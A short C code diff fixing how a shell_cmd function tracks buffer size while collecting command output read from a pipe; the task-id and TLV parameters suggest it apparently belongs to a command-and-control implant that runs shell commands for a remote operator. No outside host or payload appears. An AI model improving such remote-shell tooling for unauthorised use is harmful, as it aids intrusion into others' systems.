@@ -52,13 +52,14 @@ void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   char * outBuffer = malloc(1);
   char * filePart = malloc(1024);
   
-  DWORD bufferSize = 1;
+  DWORD bufferSize = 0;
   DWORD dwRead = 0;
 
   while (ReadFile(outRead, filePart, 1024, &dwRead, NULL)) {
     if (dwRead == 0) break;
     printf("read: %u bytes\n", dwRead);
     outBuffer = realloc(outBuffer, bufferSize + dwRead);
+    bufferSize += dwRead;
     memcpy(outBuffer + bufferSize - dwRead, filePart, dwRead);
   }
 
